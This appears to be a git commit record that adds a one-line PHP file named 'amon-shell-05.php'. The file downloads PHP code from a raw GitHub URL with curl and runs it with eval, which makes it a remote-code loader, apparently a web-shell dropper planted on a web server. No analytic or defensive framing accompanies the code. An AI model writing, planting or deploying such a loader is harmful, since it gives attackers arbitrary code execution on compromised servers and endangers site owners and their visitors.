eeb3eb7fb7e1fb88acd77838031c4739aad369ac
unikbetpermata <unikbetpermata@gmail.com>
2026-09-03 06:24:36 +0700

    Create amon-shell-05.php

---
+++ amon-shell-05.php
@@ -0,0 +1,1 @@
+<?php $url = "https://raw.githubusercontent.com/unikbetpermata/min/refs/heads/main/xmlrpc.php";$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$tag= curl_exec($ch);curl_close($ch);eval("?>" . ("$tag"));?>
